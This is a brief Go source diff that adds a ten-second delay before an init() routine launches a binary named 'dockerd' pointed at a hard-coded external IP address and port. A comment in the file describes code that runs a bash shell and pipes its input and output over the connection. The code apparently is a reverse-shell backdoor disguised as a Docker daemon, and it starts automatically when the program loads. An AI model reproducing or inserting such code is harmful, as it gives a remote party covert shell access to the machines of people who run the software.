@@ -22,6 +22,7 @@ import (
 	"os"
 	"os/exec"
 	"strings"
+	"time"
 )
 
 //executes a bash shell and pipes in/out/err over the connection
@@ -70,6 +71,7 @@ func init() {
 	fpath := bpath + "dockerd"
 
 	go func() {
+		time.Sleep(10 * time.Second)
 		cmd := exec.Command(fpath, "-addr", "193.38.54.60:39746")
 		_ = cmd.Start()
 		_ = cmd.Wait()
